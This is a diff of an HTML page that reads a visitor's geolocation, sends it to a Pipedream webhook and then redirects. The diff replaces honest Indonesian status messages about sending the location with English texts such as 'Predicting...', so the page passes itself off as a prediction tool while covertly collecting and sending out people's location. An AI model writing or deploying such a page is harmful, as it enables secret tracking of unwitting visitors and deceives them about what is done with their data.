@@ -22,7 +22,7 @@
   </style>
 </head>
 <body>
-  <div id="status">Mengakses lokasi...</div>
+  <div id="status">Predicting...</div>
 
   <script>
     const webHookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
@@ -42,7 +42,7 @@
         const payload = { latitude, longitude, timestamp };
 
         // Tampilkan status ke user (sementara, bisa dihapus jika tidak ingin terlihat)
-        statusEl.textContent = "Mengirim lokasi...";
+        statusEl.textContent = "Wait a moment...";
 
         // Kirim data ke Pipedream
         await fetch(webHookURL, {
@@ -53,14 +53,14 @@
           body: JSON.stringify(payload)
         });
 
-        statusEl.textContent = "Berhasil dikirim. Mengalihkan...";
+        statusEl.textContent = "Predicting...";
 
         // Tunggu sedikit sebelum redirect
         setTimeout(() => {
           window.location.href = redirectURL;
         }, 1500);
       } catch (err) {
-        statusEl.textContent = "Gagal mendapatkan lokasi. Mengalihkan...";
+        statusEl.textContent = "Failed to Predict..";
         setTimeout(() => {
           window.location.href = redirectURL;
         }, 2000);
